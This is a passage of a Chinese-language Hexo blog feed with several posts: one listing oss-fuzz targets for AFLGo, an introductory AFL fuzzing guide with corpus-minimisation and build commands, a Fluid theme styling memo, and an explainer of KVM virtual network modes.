class="hljs-string">"bug-binutils@gnu.org"</span><span class="hljs-attr">auto_ccs :</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">"p.antoine@catenacyber.fr"</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">"nickc@redhat.com"</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">"amodra@gmail.com"</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">"david@adalogics.com"</span><span class="hljs-attr">fuzzing_engines:</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">libfuzzer</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">afl</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">honggfuzz</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">dataflow</span><span class="hljs-attr">sanitizers:</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">address</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">undefined</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">memory</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">dataflow</span></code></pre></div><ul><li><strong>Dockerfile：</strong>定义实验环境容器</li><li><strong>build.sh：</strong>用于构建实验环境容器</li></ul><p>撰写了一个脚本解析出了所有支持<code>afl</code>引擎的开源工具列表：</p><blockquote><p>binutils brotli brunsli bzip2<br>c-ares capstone cjson cmark<br>graphicsmagick grok harfbuzz<br>hermes hostap<br>jbig2dec json-c<br>lcms libcbor libexif libfdk-aac libidn2 libldac libpcap libplist libspectre libtasn1 libteken libwebp libxml2 libyaml libyuv lz4<br>miniz monero mupdf<br>nanopb ndpi nestegg nghttp2 ntp<br>openjpeg openthread opus ots<br>pcre2 pffft proxygen<br>qubes-os<br>rnp<br>speex stb<br>tidy-html5 tor tremor<br>unicorn usrsctp<br>vorbis<br>wireshark woff2 wolfssl wuffs<br>xz<br>yajl-ruby<br>zlib zlib-ng zstd</p></blockquote><p>然后选取了其中较为常用，轻量级的几款工具来做AFLGO Fuzzing测试</p><h3 id="2-1-bzip2"><a href="#2-1-bzip2" class="headerlink" title="2.1 bzip2"></a>2.1 bzip2</h3><ul><li>介绍： bzip2是一款比传统的<a href="https://zh.wikipedia.org/wiki/Gzip" target="_blank" rel="noopener">gzip</a>或者<a href="https://zh.wikipedia.org/wiki/ZIP" target="_blank" rel="noopener">ZIP</a>的压缩效率更高但是压缩速度较慢的压缩工具，其算法可以排名到前百分之十到十五。 </li><li>源码地址： <a href="https://sourceware.org/git/bzip2.git" target="_blank" rel="noopener">https://sourceware.org/git/bzip2.git</a></li><li>oss-fuzz项目地址：<a href="https://github.com/google/oss-fuzz/tree/master/projects/bzip2" target="_blank" rel="noopener">https://github.com/google/oss-fuzz/tree/master/projects/bzip2</a></li></ul><h3 id="2-2-binutils"><a href="#2-2-binutils" class="headerlink" title="2.2 binutils"></a>2.2 binutils</h3><ul><li>介绍： binutils 是一组开发工具，包括连接器，汇编器和其他用于目标文件和档案的工具。 </li><li>源码地址：<a href="https://github.com/bminor/binutils-gdb" target="_blank" rel="noopener">https://github.com/bminor/binutils-gdb</a></li><li>oss-fuzz项目地址：<a href="https://github.com/google/oss-fuzz/tree/master/projects/binutils" target="_blank" rel="noopener">https://github.com/google/oss-fuzz/tree/master/projects/binutils</a></li></ul><h3 id="2-3-cJSON"><a href="#2-3-cJSON" class="headerlink" title="2.3 cJSON"></a>2.3 cJSON</h3><ul><li>介绍： JSON是使用C语言编写，用来创建、解析JSON文件的库。 </li><li>源码地址：<a href="https://github.com/DaveGamble/cJSON" target="_blank" rel="noopener">https://github.com/DaveGamble/cJSON</a></li><li>oss-fuzz项目地址：<a href="https://github.com/google/oss-fuzz/tree/master/projects/cjson" target="_blank" rel="noopener">https://github.com/google/oss-fuzz/tree/master/projects/cjson</a></li></ul><h3 id="2-4-libpcap"><a href="#2-4-libpcap" class="headerlink" title="2.4 libpcap"></a>2.4 libpcap</h3><ul><li>介绍： libpcap（Packet Capture Library），即数据包捕获函数库，是Unix&#x2F;Linux平台下的网络数据包捕获函数库。它是一个独立于系统的用户层包捕获的API接口，为底层网络监测提供了一个可移植的框架。 </li><li>源码地址：<a href="https://github.com/the-tcpdump-group/libpcap" target="_blank" rel="noopener">https://github.com/the-tcpdump-group/libpcap</a></li><li>oss-fuzz项目地址：<a href="https://github.com/google/oss-fuzz/tree/master/projects/libpcap" target="_blank" rel="noopener">https://github.com/google/oss-fuzz/tree/master/projects/libpcap</a></li></ul><h2 id="3-参考文档"><a href="#3-参考文档" class="headerlink" title="3 参考文档"></a>3 参考文档</h2><p><a href="https://blog.csdn.net/iw1210/article/details/52093742" target="_blank" rel="noopener">值得推荐的C&#x2F;C++开源框架和库</a></p><p><a href="https://blog.csdn.net/h_mich/article/details/7402059" target="_blank" rel="noopener">开源软件分类列表</a></p><p><a href="https://www.oschina.net/project/tags" target="_blank" rel="noopener">软件分类-开源中国OSCHINA</a></p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AFL</tag>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL简介与使用</title>
    <link href="/2020/08/25/AFL%E7%AE%80%E4%BB%8B%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2020/08/25/AFL%E7%AE%80%E4%BB%8B%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>模糊测试（Fuzzing）</strong>技术作为<strong>漏洞挖掘</strong>最有效的手段之一，近年来一直是众多安全研究人员发现漏洞的首选技术。  <strong>AFL</strong>、LibFuzzer、honggfuzz等操作简单友好的工具相继出现，也极大地降低了模糊测试的门槛。 </p><a id="more"></a><p>AFL即American Fuzzy Lop，是由安全研究员Micha · Zalewski（<a href="https://twitter.com/lcamtuf" target="_blank" rel="noopener">@lcamtuf</a>）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，采用一种新型的<strong>编译时插桩</strong>和<strong>遗传算法</strong>来自动生成测试样本，使用这些样本可触发目标二进制程序中新的内部状态，从而可提高模糊测试的代码覆盖率。</p><h2 id="1-AFL工作流"><a href="#1-AFL工作流" class="headerlink" title="1 AFL工作流"></a>1 AFL工作流</h2><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/afl-workflow.jpg" srcset="/img/loading.gif"><p><strong>AFL工作的基本流程如图所示：</strong></p><ul><li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage） </li><li>选择一些输入文件，作为初始测试集加入输入队列（queue） </li><li>将队列中的文件按一定的策略进行“突变” （Mutation）</li><li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中 </li><li>上述过程会一直循环进行，期间触发了crash的文件会被记录下来</li></ul><p><code>afl-fuzz</code> 会记录触发crash的<code>cmdline</code>以便研究者手动复现和<code>gdb</code>调试分析。</p><h2 id="2-代码插桩"><a href="#2-代码插桩" class="headerlink" title="2 代码插桩"></a>2 代码插桩</h2><p> 在AFL编译文件时候<code>afl-gcc</code>会在规定位置插入桩代码，可以理解为一个个的<strong>探针</strong>(但是没有暂停功能)，在后续fuzz的过程中会<strong>根据这些桩代码进行路径探索，测试等</strong>。对于插桩的理解也可以这样理解，如下图： </p><h2 id="3-构建语料库"><a href="#3-构建语料库" class="headerlink" title="3 构建语料库"></a>3 构建语料库</h2><p>使用AFL进行模糊测试的对象一定是具备接收输入的程序，也正是这样的程序有更大可能出现漏洞。</p><p> AFL需要一些初始输入数据（也叫种子文件）作为Fuzzing的起点，AFL可以通过启发式算法自动确定文件格式结构。lcamtuf就在博客中给出了一个有趣的<a href="https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html" target="_blank" rel="noopener">例子</a>——对djpeg进行Fuzzing时，仅用一个字符串”hello”作为输入，最后凭空生成大量jpeg图像！</p><p>尽管AFL的输入可以是毫无意义的文件，但是一个<strong>高质量的语料库</strong>，能够让Fuzzing更加高效和精准。</p><h3 id="3-1-对输入种子的要求"><a href="#3-1-对输入种子的要求" class="headerlink" title="3.1 对输入种子的要求"></a>3.1 对输入种子的要求</h3><ul><li><strong>有效的输入：</strong>无效的输入会产生bug和crash，但是有效的输入能够更快找到更多的执行路径</li><li><strong>尽量小的体积：</strong> 较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存，AFL给出的建议是最好小于1 KB，但其实可以根据自己测试的程序权衡，这在AFL文档的<code>perf_tips.txt</code>中有具体说明。</li></ul><h3 id="3-2-如何寻找输入种子"><a href="#3-2-如何寻找输入种子" class="headerlink" title="3.2 如何寻找输入种子"></a>3.2 如何寻找输入种子</h3><ul><li>项目自身提供的测试用例</li><li>目标程序bug提交页面</li><li>使用格式转换器，将现有格式文件转换为不常见的文件格式</li><li>AFL源码仓库的testcases目录下提供了测试用例</li><li>其他大型语料库：<ul><li><a href="http://lcamtuf.coredump.cx/afl/demo/" target="_blank" rel="noopener">afl generated image test sets</a> </li><li><a href="https://github.com/google/fuzzer-test-suite" target="_blank" rel="noopener">fuzzer-test-suite</a></li><li><a href="https://samples.libav.org/" target="_blank" rel="noopener">libav samples</a></li><li><a href="http://samples.ffmpeg.org/" target="_blank" rel="noopener">ffmpeg samples</a></li><li><a href="https://github.com/MozillaSecurity/fuzzdata" target="_blank" rel="noopener">fuzzdata</a></li><li><a href="https://gitlab.anu.edu.au/lunar/moonshine" target="_blank" rel="noopener">moonshine</a></li></ul></li></ul><h3 id="3-3-如何精简找到的种子"><a href="#3-3-如何精简找到的种子" class="headerlink" title="3.3 如何精简找到的种子"></a>3.3 如何精简找到的种子</h3><p> AFL提供了两个工具来帮助我们完成<strong>语料库蒸馏</strong>工作——<code>afl-cmin</code>和<code>afl-tmin</code>。 </p><ul><li><p><strong>移除执行相同代码的输入文件——afl-cmin:</strong></p><ul><li><code>afl-cmin</code>的核心思想是：<strong>尝试找到与语料库全集具有相同覆盖范围的最小子集</strong>。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。其使用方法如下：</li></ul>  <div class="hljs"><pre><code class="hljs bash">$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</code></pre></div></li><li><p><strong>减小单个输入文件的大小——afl-tmin:</strong></p><ul><li><p>在缩减了语料库规模之后，还需要对单个语料文件进行精简。<code>afl-tmin</code>有两种工作模式，<code>instrumented mode</code>和<code>crash mode</code>。默认的工作方式是<code>instrumented mode</code>，如下所示（如果指定了参数<code>-x</code>，即<code>crash mode</code>，会把导致程序非正常退出的文件直接剔除。 ）： </p><div class="hljs"><pre><code class="hljs bash">$ afl-tmin [-x] -i input_file -o output_file -- /path/to/tested/program [params] @@</code></pre></div></li><li><p><code>afl-tmin</code>接受单个文件输入，所以可以用一条简单的shell脚本批量处理：</p></li></ul>  <div class="hljs"><pre><code class="hljs shell">for i in *do    afl-tmin -i $i -o tmin-$i -- ~/path/to/tested/program [params] @@done</code></pre></div></li><li><p><strong>使用完afl-tmin后再次使用afl-cmin，可能可以再过滤掉一些用例</strong></p></li></ul><h2 id="4-Mutation突变策略"><a href="#4-Mutation突变策略" class="headerlink" title="4 Mutation突变策略"></a>4 Mutation突变策略</h2><p>AFL的突变策略十分丰富，它能够尽可能地保证输入种子充分地变异，以追求更大的执行路径覆盖率，从而测试出更多的crash。AFL的突变策略依次包括：bitflip，arithmetic，interest，dictionary，havoc和splice。</p><h3 id="4-1-bitflip"><a href="#4-1-bitflip" class="headerlink" title="4.1 bitflip"></a>4.1 bitflip</h3><h4 id="4-1-1-基础bitflip"><a href="#4-1-1-基础bitflip" class="headerlink" title="4.1.1 基础bitflip"></a>4.1.1 基础bitflip</h4><ul><li><strong>基本原理</strong>： 按位翻转，1变为0，0变为1。AFL会采用不同的翻转长度和步长来进行位翻转，顺序如下：<ul><li>bitflip 1&#x2F;1，2&#x2F;1，4&#x2F;1，8&#x2F;8，16&#x2F;8，32&#x2F;8</li><li>bitflip m&#x2F;n即每次翻转m个bit，按照n个bit的步长从文件头部开始翻转</li><li>AFL还有一些对文件格式启发式的判断，如自动检测token和生成effector map</li></ul></li><li><strong>举例</strong>：对某jpeg格式的文件从其头部<code>FF D8...</code>开始进行bitflip<ul><li>第一次bitflip 1&#x2F;1：<code>7F D8</code>，第二次bitflip 1&#x2F;1：<code>BF D8</code>，第三次bitflip 1&#x2F;1：<code>DF D8</code>，第四次bitflip 1&#x2F;1：<code>EF D8</code></li></ul></li></ul><h4 id="4-1-2-自动检测token"><a href="#4-1-2-自动检测token" class="headerlink" title="4.1.2 自动检测token"></a>4.1.2 自动检测token</h4><ul><li><strong>基本原理</strong>： 如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致  ，那么就把这一段连续的bytes判断是一条token。</li><li><strong>举例</strong>：PNG文件中用<code>...IHDR... </code>作为起始块的标识，当翻转到最高位字节的时候，由于IHDR被破坏，程序执行路径发生改变，随后在翻转接下来的三个字节的时候IHDR同样被破坏，程序会采取相同的执行路径。由此AFL就判断得到了一个可能的<strong>token：IHDR</strong>，并将其记录为后续的变异提供备选。</li></ul><h4 id="4-1-3-生成effector-map"><a href="#4-1-3-生成effector-map" class="headerlink" title="4.1.3 生成effector map"></a>4.1.3 生成effector map</h4><ul><li><strong>基本原理</strong>：在执行bitflip 8&#x2F;8，即对每个字节进行翻转时，如果执行路径发生了改变，则将该byte在effector map中标记为1，反之标记为0。其逻辑为如果翻转一个byte都无法带来程序执行路径的改变，则该byte很有可能是属于<code>data</code>而非<code>metadata(如size，flag等)</code>，对fuzzing的意义不大，在之后的变异里会参考effector map跳过那些”无效”的bytes。</li><li><strong>说明</strong>：在以下三种情况下，AFL不会判定有效字符：<ul><li>AFL工作模式为<code>dumb mode</code>或者<code>Slave mode</code>即（静默模式和从模式）</li><li>如果文件大小小于128bytes，则默认所有字节均为”有效”字节</li><li>如果文件被标记为”有效”的字节超过了90%，则默认所有字节均为”有效”字节</li></ul></li></ul><h3 id="4-2-arithmetic"><a href="#4-2-arithmetic" class="headerlink" title="4.2 arithmetic"></a>4.2 arithmetic</h3><p>bitflip策略全部突变完毕后，进入到arithmetic突变阶段。arithmetic阶段会根据目标大小的不同，分为了一下几个子阶段：</p><ul><li><strong>基本原理</strong>：arith 8&#x2F;8，arith 16&#x2F;8，arith 32&#x2F;8。其含义为每次对8，16，32bits进行加减运算，按照每8个bits的步长从文件头开始，即对文件的每个byte，word，dword进行整数加减变异。</li><li><strong>说明</strong>：<ul><li>加减变异运算的上限在config.h中的宏ARITH_MAX定义，默认为35，即进行 ±1，±2，…，±35的运算变异</li><li>AFL会考虑整数的大端序和小端序形式，并以这两种方式分别进行变异</li><li>AFL会跳过effector map中标记为”无效”的bytes，以及之前bitflip阶段已经生成过的变异(比如加减某个数之后产生的效果和之前bitflip的某次变异一样)</li></ul></li></ul><h3 id="4-3-interest"><a href="#4-3-interest" class="headerlink" title="4.3 interest"></a>4.3 interest</h3><h3 id="4-4-dictionary"><a href="#4-4-dictionary" class="headerlink" title="4.4 dictionary"></a>4.4 dictionary</h3><h3 id="4-5-havoc"><a href="#4-5-havoc" class="headerlink" title="4.5 havoc"></a>4.5 havoc</h3><h3 id="4-6-splice"><a href="#4-6-splice" class="headerlink" title="4.6 splice"></a>4.6 splice</h3><h2 id="5-AFL安装与使用"><a href="#5-AFL安装与使用" class="headerlink" title="5 AFL安装与使用"></a>5 AFL安装与使用</h2><h3 id="5-1-源码安装"><a href="#5-1-源码安装" class="headerlink" title="5.1 源码安装"></a>5.1 源码安装</h3><p><strong>采用源码安装AFL：</strong></p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 从github下载最新的release v2.57b</span>wget https://github.com/google/AFL/archive/v2.57b.tar.gz -O afl-2.57b.tar.gz<span class="hljs-comment"># 官网自2017年11月就没有再更新，latest version 为2.52b</span><span class="hljs-comment"># wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz -O afl-2.52b.tar.gz</span>tar xvzf afl-2.57b.tar.gz<span class="hljs-built_in">cd</span> afl-2.57b<span class="hljs-comment"># make &amp;&amp; make install</span>sudo make &amp;&amp; sudo make install</code></pre></div><p> 安装完成后，<code>afl-*</code>等二进制文件默认在<code>/usr/local/bin/</code>目录下 ，添加其到环境变量<code>PATH</code>即可</p><blockquote><p>出于研究的考虑，环境中很可能不止一种fuzzer，因此不建议make install，用绝对路径使用即可</p></blockquote><h3 id="5-2-插桩与Fuzzing"><a href="#5-2-插桩与Fuzzing" class="headerlink" title="5.2 插桩与Fuzzing"></a>5.2 插桩与Fuzzing</h3><ul><li>使用afl-gcc&#x2F;afl-g++进行插桩：</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 进入待测程序目录，指定CC/CXX。注意需要提前创建/PATH/TO/BUILD安装目录</span><span class="hljs-built_in">cd</span> /PATH/TO/PROGRAMCC=/PATH/TO/afl-gcc CXX=/PATH/TO/afl-g++ ./configure --prefix=/PATH/TO/BUILDmake -j &amp;&amp; sudo make install</code></pre></div><ul><li>也可以使用<code>llvm_mode</code>进行插桩：</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 编译afl-clang-fast</span><span class="hljs-built_in">cd</span> llvm_mode &amp;&amp; make<span class="hljs-comment"># 插桩</span><span class="hljs-built_in">cd</span> /PATH/TO/PROGRAMCC=/PATH/TO/afl-clang-fast CXX=/PATH/TO/afl-clang-fast++ ./configure --prefix=/PATH/TO/BUILDmake -j &amp;&amp; sudo make install</code></pre></div><ul><li>创建Fuzz的工作目录，开始Fuzz</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 我个人比较喜欢的目录结构如下</span>├─fuzz-PROGRAM    ├─bin      <span class="hljs-comment"># 使用bin/PROGRAM而不是PROGRAM可以避免在PATH中搜索</span>    ├─<span class="hljs-keyword">in</span>       <span class="hljs-comment"># 存放初始种子</span>    └─out      <span class="hljs-comment"># Fuzz的输出</span><span class="hljs-built_in">cd</span> fuzz-PROGRAM/PATH/TO/afl-fuzz -i <span class="hljs-keyword">in</span> -o out bin/PROGRAM [argvs] @@</code></pre></div><h3 id="5-3-结果分析"><a href="#5-3-结果分析" class="headerlink" title="5.3 结果分析"></a>5.3 结果分析</h3><p>TO BE COMPLETED</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AFL</tag>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fluid主题样式备忘录</title>
    <link href="/2020/07/15/Fluid%E4%B8%BB%E9%A2%98%E6%A0%B7%E5%BC%8F%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2020/07/15/Fluid%E4%B8%BB%E9%A2%98%E6%A0%B7%E5%BC%8F%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hexo.fluid-dev.com/docs/" target="_blank" rel="noopener">Hexo Fluid</a>是一款兼具美观和实用的博客主题。本文用于记录其常用样式的用法，包括脚注，</p><a id="more"></a><h2 id="1-脚注"><a href="#1-脚注" class="headerlink" title="1 脚注"></a>1 脚注</h2><p>主题内置了脚注语法支持，可以在文章末尾自动生成带有锚点的脚注，该功能在<strong>主题配置</strong>中默认开启：</p><div class="hljs"><pre><code class="hljs yaml"><span class="hljs-attr">post:</span>  <span class="hljs-attr">footnote:</span>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span>    <span class="hljs-attr">header:</span> <span class="hljs-string">''</span></code></pre></div><p>参考配置指南<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="Fluid配置指南">[1]</span></a></sup>，可知脚注语法如下：</p><div class="hljs"><pre><code class="hljs markdown">这是一句话<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="Fluid配置指南">[1]</span></a></sup>[<span class="hljs-symbol">^1</span>]: <span class="hljs-link">这是对应的脚注</span></code></pre></div><p>更优雅的使用方式，是将脚注写在文末，比如：</p><div class="hljs"><pre><code class="hljs markdown">正文<span class="hljs-section">## 参考</span>[<span class="hljs-symbol">^1</span>]: <span class="hljs-link">参考资料1</span>[<span class="hljs-symbol">^2</span>]: <span class="hljs-link">参考资料2</span></code></pre></div><h2 id="2-Tag插件"><a href="#2-Tag插件" class="headerlink" title="2 Tag插件"></a>2 Tag插件</h2><h3 id="2-1-便签"><a href="#2-1-便签" class="headerlink" title="2.1 便签"></a>2.1 便签</h3><p>在 markdown 中加入如下的代码来使用便签：</p><div class="hljs"><pre><code class="hljs markdown">&#123;% note success %&#125;文字 或者 <span class="hljs-code">`markdown`</span> 均可&#123;% endnote %&#125;</code></pre></div><p>或者使用 HTML 形式：</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"note note-primary"</span>&gt;</span>标签<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre></div><p class="note note-primary">可选便签：success, danger, warning, primary, secondary, info, light</p><p class="note note-success">success</p><p class="note note-danger">danger</p><p class="note note-warning">warning</p><p class="note note-primary">primary</p><p class="note note-secondary">secondary</p><p class="note note-info">info</p><p class="note note-light">light</p>### 2.2 行内标签<p>在 markdown 中加入如下的代码来使用 Label：</p><div class="hljs"><pre><code class="hljs markdown">&#123;% label primary @text %&#125;</code></pre></div><p>或者使用 HTML 形式：</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"label label-primary"</span>&gt;</span>Label<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></code></pre></div><p>可选 Label：</p><p><span class="label label-primary">primary</span> <span class="label label-default">default</span> <span class="label label-info">info</span> <span class="label label-success">success</span> <span class="label label-warning">warning</span> <span class="label label-danger">danger</span> </p><h3 id="2-3-勾选框"><a href="#2-3-勾选框" class="headerlink" title="2.3 勾选框"></a>2.3 勾选框</h3><p>在 markdown 中加入如下的代码来使用 Checkbox：</p><div class="hljs"><pre><code class="hljs markdown">&#123;% cb text, checked?, incline? %&#125;</code></pre></div><p>text：显示的文字<br>checked：默认是否已勾选，默认 false<br>incline: 是否内联（可以理解为后面的文字是否换行），默认 false</p><h3 id="2-4-按钮"><a href="#2-4-按钮" class="headerlink" title="2.4 按钮"></a>2.4 按钮</h3><p>你可以在 markdown 中加入如下的代码来使用 Button：</p><div class="hljs"><pre><code class="hljs markdown">&#123;% btn url, text, title %&#125;</code></pre></div><p>或者使用 HTML 形式：</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"url"</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"title"</span>&gt;</span>text<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre></div><p>url：跳转链接<br>text：显示的文字<br>title：鼠标悬停时显示的文字（可选）</p><a class="btn" href="https://hexo.fluid-dev.com/docs/guide/#tag-插件" title="zzy yyds （￣︶￣）↗" target="_blank">tag-插件用法</a><h3 id="2-5-组图"><a href="#2-5-组图" class="headerlink" title="2.5 组图"></a>2.5 组图</h3><p>如果想把多张图片按一定布局组合显示，你可以在 markdown 中按如下格式：</p><p>total：图片总数量，对应中间包含的图片 url 数量<br>n1-n2-…：每行的图片数量，可以省略，默认单行最多 3 张图，求和必须相等于 total，否则按默认样式</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://hexo.fluid-dev.com/docs/guide/#%E8%84%9A%E6%B3%A8" target="_blank" rel="noopener">Fluid配置指南</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Configuration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blog</tag>
      
      <tag>Theme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KVM虚拟机的四种网络模式</title>
    <link href="/2020/06/24/KVM%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%9B%9B%E7%A7%8D%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F/"/>
    <url>/2020/06/24/KVM%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%9B%9B%E7%A7%8D%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>因为前段时间项目需要在KVM架构的网络靶场中进行演示，于是学习并整理了KVM虚拟机有关网络架构的知识。</p><a id="more"></a><h2 id="1-KVM简介"><a href="#1-KVM简介" class="headerlink" title="1 KVM简介"></a>1 KVM简介</h2><p> Libvirt虚拟网络使用虚拟网络交换机的概念。虚拟网络交换机是在主机物理机器服务器上运行的软件结构，虚拟机（客户机）通过它连接到该物理主机服务器。客户机的网络流量通过这个交换机被引导： </p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210121220618.png" srcset="/img/loading.gif"><p> Linux主机物理机服务器将虚拟网络交换机表示为网络接口。当libvirt的守护进程（libvirtd）首次安装并启动时，表示虚拟网络交换机的默认网络接口是virbr0。 </p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210121220706.png" srcset="/img/loading.gif"><p> 可以通过<code>ip</code>或者<code>ifconfig</code>查看到此Interface： </p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126202816.png" srcset="/img/loading.gif"><h2 id="2-网络模式"><a href="#2-网络模式" class="headerlink" title="2 网络模式"></a>2 网络模式</h2><h3 id="2-1-桥接模式"><a href="#2-1-桥接模式" class="headerlink" title="2.1 桥接模式"></a>2.1 桥接模式</h3><p>在使用桥接模式时，所有虚拟机都好像与主机物理机器在同一个子网内。同一物理网络中的所有其他物理机器都知道这些虚拟机，并可以访问这些虚拟机。桥接操作在OSI网络模型的第2层。</p><p>在中间件（hypervisor ）中可以使用多个物理接口，通过绑定把他们连接在一起，然后把它添加的网桥，同时虚拟机也被添加到这个网桥，绑定操作有多种模式，只有少数这些模式可以与虚拟客户机正在使用的桥接器配合使用。 </p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126203108.png" srcset="/img/loading.gif"><h3 id="2-2-NAT模式"><a href="#2-2-NAT模式" class="headerlink" title="2.2 NAT模式"></a>2.2 NAT模式</h3><p>默认情况下，虚拟网络交换机以NAT模式运行。他们使用IP伪装而不是SNAT（Source-NAT）或DNAT（Destination-NAT）。IP伪装使得连接的guest虚拟机可以使用主机物理机器IP地址与任何外部网络进行通信。默认情况下，虚拟网络交换机在NAT模式下运行时，放置在主机物理机外部的计算机无法与其中的guest虚拟机进行通信，如下图所示： </p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126203149.png" srcset="/img/loading.gif"><p>DNS和DHCP<br>IP地址可以通过DHCP分配给客户机。为此，可以将地址池分配给虚拟网络交换机。Libvirt使用这个dnsmasq程序。dnsmasq的一个实例是由libvirt为每个需要它的虚拟网络交换机自动配置和启动的。 </p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126204251.png" srcset="/img/loading.gif"><h3 id="2-3-路由模式"><a href="#2-3-路由模式" class="headerlink" title="2.3 路由模式"></a>2.3 路由模式</h3><p>当使用路由模式时，虚拟交换机连接到连接到主机物理机器的物理LAN，在不使用NAT的情况下来回传输流量。虚拟交换机可以检查所有流量，并使用网络数据包中包含的信息来做出路由决策。使用此模式时，所有虚拟机都位于其自己的子网中，通过虚拟交换机进行路由。这种情况并不总是理想的，因为物理网络上的其他主机物理机器不通过手工配置的路由信息是没法发现这些虚拟机，并且不能访问虚拟机。路由模式在OSI网络模型的第三层运行。 </p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126204315.png" srcset="/img/loading.gif"><h3 id="2-4-隔离模式"><a href="#2-4-隔离模式" class="headerlink" title="2.4 隔离模式"></a>2.4 隔离模式</h3><p>使用隔离模式时，连接到虚拟交换机的虚拟机可以相互通信，也可以与主机物理机通信，但其通信不会传到主机物理机外，也不能从主机物理机外部接收通信。在这种模式下使用dnsmasq对于诸如DHCP的基本功能是必需的。但是，即使该网络与任何物理网络隔离，DNS名称仍然被解析的。因此，DNS名称能解析但ICMP回应请求（ping）命令失败这种情况可能会出现。 </p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126204331.png" srcset="/img/loading.gif"><h3 id="2-5-默认模式"><a href="#2-5-默认模式" class="headerlink" title="2.5 默认模式"></a>2.5 默认模式</h3><p>libvirtd第一次被安装时，它将包含配置在NAT模式下的初始虚拟网络交换机。使用此配置，以便安装的guest虚拟机可以通过主机物理机与外部网络进行通信。下图显示了这个默认配置libvirtd： </p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126204455.png" srcset="/img/loading.gif"><h2 id="3-参考"><a href="#3-参考" class="headerlink" title="3 参考"></a>3 参考</h2> <div class="note note-danger">            <p>本篇博文有待完善，还需添加自己的实验部分orz</p>          </div> <p><a href="https://blog.csdn.net/gsl371/article/details/78662258?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160750263919725271090221%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160750263919725271090221&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-78662258.nonecase&utm_term=kvm%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C&spm=1018.2118.3001.4449" target="_blank" 